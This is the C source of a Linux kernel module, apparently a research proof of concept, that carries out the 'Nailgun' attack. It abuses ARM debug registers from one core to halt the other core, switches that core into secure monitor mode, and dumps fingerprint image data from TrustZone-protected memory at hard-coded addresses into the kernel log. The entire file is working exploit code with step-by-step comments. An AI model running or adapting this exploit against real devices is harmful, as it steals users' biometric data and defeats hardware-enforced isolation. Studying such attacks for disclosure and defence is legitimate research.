#include <linux/module.h>    // included for all kernel modules
#include <linux/kernel.h>    // included for KERN_INFO
#include <linux/init.h>      // included for __init and __exit macros
#include <asm/io.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Zhenyu Ning");
MODULE_DESCRIPTION("Using Nailgun attack to extract fingerprint image");
MODULE_INFO(vermagic, "3.10.30-00146-g71289f7-dirty SMP preempt mod_unload ARMv7 p2v8 ");

// 0xFFEB0000 is the base address of the debug registers on Core 0
#define DEBUG_REGISTER_ADDR             0xFFEB0000
#define DEBUG_REGISTER_SIZE             0x1000

#define FINGPRINT_DATA_POINTER_ADDR     0x2EFAD510
#define FINGPRINT_DATA_SIZE_ADDR        0x2EF7F414

// Offsets of debug registers
#define DBGITR_OFFSET                   0x84
#define DBGDSCR_OFFSET                  0x88
#define DBGDTRTX_OFFSET                 0x8c
#define DBGDRCR_OFFSET                  0x90
#define DBGOSLAR_OFFSET                 0x300
#define DBGLAR_OFFSET                   0xfb0

// Bits in DBGDSCR
#define HALTED                          (1 <<  0)
#define RESTARTED                       (1 <<  1)
#define ITREN                           (1 << 13)
#define HDBGEN                          (1 << 14)
#define INSTR_COMPLE_L                  (1 << 24)
#define TXFULL_L                        (1 << 26)

// Bits in DBGDRCR
#define HRQ                             (1 <<  0)
#define RRQ                             (1 <<  1)

static void execute_ins_via_itr(void __iomem *debug, uint32_t ins) {
    uint32_t reg;
    // Write instruction to DBGITR register to execute it
    iowrite32(ins, debug + DBGITR_OFFSET);
    
    // Wait until the execution is finished
    reg = ioread32(debug + DBGDSCR_OFFSET);
    while ((reg & INSTR_COMPLE_L) != INSTR_COMPLE_L) {
        reg = ioread32(debug + DBGDSCR_OFFSET);
    }
}

static uint32_t read_register_via_r0(void __iomem *debug, uint32_t ins) {
    uint32_t reg;
    // Execute the ins to copy the target register to R0
    execute_ins_via_itr(debug, ins);
    // Copy R0 to the DCC register DBGDTRTX
    // 0xee000e15 <=> mcr p14, 0, R0, c0, c5, 0
    execute_ins_via_itr(debug, 0xee000e15);
    // Read the DBGDTRTX via the memory mapped interface
    reg = ioread32(debug + DBGDSCR_OFFSET);
    if ((reg & TXFULL_L) != TXFULL_L) {
        printk(KERN_ERR "%s failed! DBGDSCR: 0x%08x\n", __func__, reg);
        return 0;
    }
    return ioread32(debug + DBGDTRTX_OFFSET);
}

static uint32_t read_memory_via_dcc(void __iomem *debug, uint32_t addr) {
    // movw R0, addr[15:0]
    uint32_t inst = 0xe3000000 | ((addr & 0xf000) << 4) | (addr & 0xfff); 
    execute_ins_via_itr(debug, inst);
    // movt R0 addr[31:16]
    inst = 0xe3400000 | ((addr >> 12) & 0xf0000) | ((addr >> 16) & 0xfff);
    execute_ins_via_itr(debug, inst);
    // 0xe5910000 <=> ldr R0, [R0]
    execute_ins_via_itr(debug, 0xe5900000);
    // read R0 via DBGDTRTX
    return read_register_via_r0(debug, 0xee000e15); 
}

static void output_fingerprint_data(void __iomem* debug, uint32_t start, uint32_t size) {
    uint32_t i, addr, reg;
    printk(KERN_INFO "--------------------\n");
    for (i = 0; i < size; i = i + 0x10) {
        addr = start + i;
        printk(KERN_INFO "%08x: %08x %08x %08x %08x\n", addr, 
            read_memory_via_dcc(debug, addr), 
            read_memory_via_dcc(debug, addr + 0x4), 
            read_memory_via_dcc(debug, addr + 0x8),
            read_memory_via_dcc(debug, addr + 0xc));
    }
    printk(KERN_INFO "--------------------\n");
}

static void fingerprint_extraction(void __iomem* debug_register) {
    uint32_t reg, cpsr_old, fingerprint_addr, fingerprint_size;

    // Step 1: Unlock debug registers
    printk(KERN_INFO "Step 1: Unlock debug registers\n");
    iowrite32(0xc5acce55, debug_register + DBGLAR_OFFSET);
    iowrite32(0x0, debug_register + DBGOSLAR_OFFSET);

    // Step 2: Enable halting debug on the target processor
    printk(KERN_INFO "Step 2: Enable halting debug\n");
    reg = ioread32(debug_register + DBGDSCR_OFFSET);
    reg |= HDBGEN;
    iowrite32(reg, debug_register + DBGDSCR_OFFSET);

    // Step 3: Halt the target processor
    printk(KERN_INFO "Step 3: Halt the target processor\n");
    iowrite32(HRQ, debug_register + DBGDRCR_OFFSET);
    reg = ioread32(debug_register + DBGDSCR_OFFSET);
    while ((reg & HALTED) != HALTED) {
        reg = ioread32(debug_register + DBGDSCR_OFFSET);
    }

    // Step 4: Enable the usage of DBGITR in debug state
    printk(KERN_INFO "Step 4: Enable instruction execution in debug state\n");
    reg |= ITREN;
    iowrite32(reg, debug_register + DBGDSCR_OFFSET);

    // Step 5: Save R0 to stack since we are going to change R0
    printk(KERN_INFO "Step 5: Save R0 to the stack\n");
    // 0xe52d0004 <=> push {R0}
    execute_ins_via_itr(debug_register, 0xe52d0004);

    // Step 6: Switch to monitor mode to access secure resource
    printk(KERN_INFO "Step 6: Switch to monitor mode\n");
    // 0xe10f0000 <=> mrs R0, CPSR
    cpsr_old = read_register_via_r0(debug_register, 0xe10f0000);
    // 0xe3c0001f <=> bic R0, R0, 0x1f
    execute_ins_via_itr(debug_register, 0xe3c0001f);
    // 0xe3800016 <=> orr R0, R0, 0x16
    execute_ins_via_itr(debug_register, 0xe3800016);
    // 0xe129f000 <=> msr CPSR, R0
    execute_ins_via_itr(debug_register, 0xe129f000);

    // Step 7: Read the fingerprint data
    printk(KERN_INFO "Step 7: Output fingerprint data\n");
    fingerprint_addr = read_memory_via_dcc(debug_register, FINGPRINT_DATA_POINTER_ADDR);
    fingerprint_size = read_memory_via_dcc(debug_register, FINGPRINT_DATA_SIZE_ADDR);
    output_fingerprint_data(debug_register, fingerprint_addr, fingerprint_size);
    
    // Step 8: Switch back to the previous cpu mode
    printk(KERN_INFO "Step 8: Switch back to the previous cpu mode\n");
    // 0xe10f0000 <=> mrs R0, CPSR
    read_register_via_r0(debug_register, 0xe10f0000);
    // 0xe3c0001f <=> bic R0, R0, 0x1f
    execute_ins_via_itr(debug_register, 0xe3c0001f);
    execute_ins_via_itr(debug_register, 0xe3800000 | (cpsr_old & 0x1f));    
    // 0xe129f000 <=> msr CPSR, R0
    execute_ins_via_itr(debug_register, 0xe129f000);
    
    // Step 9: Restore R0 from stack
    printk(KERN_INFO "Step 9: Restore R0 from the stack\n");
    // 0xe49d0004 <=> pop {R0}
    execute_ins_via_itr(debug_register, 0xe49d0004);

    // Step 10: Disable EDITR before exiting debug state
    printk(KERN_INFO "Step 10: Disable instruction execution in debug state\n");
    reg = ioread32(debug_register + DBGDSCR_OFFSET);
    reg &= ~ITREN;
    iowrite32(reg, debug_register + DBGDSCR_OFFSET);

    // Step 11: Restart the target processor
    printk(KERN_INFO "Step 11: Restart the target processor\n");
    iowrite32(RRQ, debug_register + DBGDRCR_OFFSET);
    reg = ioread32(debug_register + DBGDSCR_OFFSET);
    while ((reg & RESTARTED) != RESTARTED) {
        reg = ioread32(debug_register + DBGDSCR_OFFSET);
    }
    printk(KERN_INFO "All done, check the kernel log to get the fingerprint data\n");
}

static int __init nailgun_init(void)
{
    void __iomem* debug_register;

    // Mapping the debug registers into virtual memory space 
    debug_register = ioremap(DEBUG_REGISTER_ADDR, DEBUG_REGISTER_SIZE);
    // We use the Core 1 to extract the fingerprint image via debugging Core 0
    smp_call_function_single(1, fingerprint_extraction, debug_register, 1);
    iounmap(debug_register);
    return 0;
}

static void __exit nailgun_cleanup(void)
{
    printk(KERN_INFO "Goodbye!\n");
}

module_init(nailgun_init);
module_exit(nailgun_cleanup);
